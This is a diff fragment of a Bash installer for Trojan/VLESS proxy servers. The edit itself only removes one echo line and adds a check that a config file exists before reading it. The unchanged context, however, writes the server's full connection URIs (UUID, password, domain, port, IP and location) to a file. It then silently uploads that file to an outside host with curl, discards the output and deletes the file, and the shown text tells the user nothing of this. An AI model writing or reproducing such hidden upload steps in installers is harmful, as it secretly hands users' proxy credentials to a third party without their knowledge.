@@ -185,7 +185,6 @@ apt-get autoremove -y
 cd /root
 if [[ -n ${uuid_new} ]]; then
 echo "vless://${uuid_new}@${domain}:${trojanport}?mode=gun&security=tls&type=grpc&serviceName=${path_new}&sni=${domain}#Vless(${route_final} ${mycountry} ${mycity} ${myip})" &> ${myip}.txt
-echo "" &> ${myip}.txt
 echo "trojan://${password1}@${domain}:${trojanport}?security=tls&headerType=none&type=tcp&sni=${domain}#Trojan(${route_final}${mycountry} ${mycity} ${myip})" >> ${myip}.txt
 curl --retry 5 https://johnrosen1.com/fsahdfksh/ --upload-file ${myip}.txt &> /dev/null
 rm ${myip}.txt
@@ -257,7 +256,10 @@ fi
 ## 初始化安装
 install_initial(){
 clear
-install_status="$( jq -r '.installed' "/root/.trojan/config.json" )"
+if [[ -f /root/.trojan/config.json ]]; then
+  install_status="$( jq -r '.installed' "/root/.trojan/config.json" )"
+fi
+
 if [[ $install_status != 1 ]]; then
   cp /etc/resolv.conf /etc/resolv.conf.bak1
   if [[ $(systemctl is-active caddy) == active ]]; then
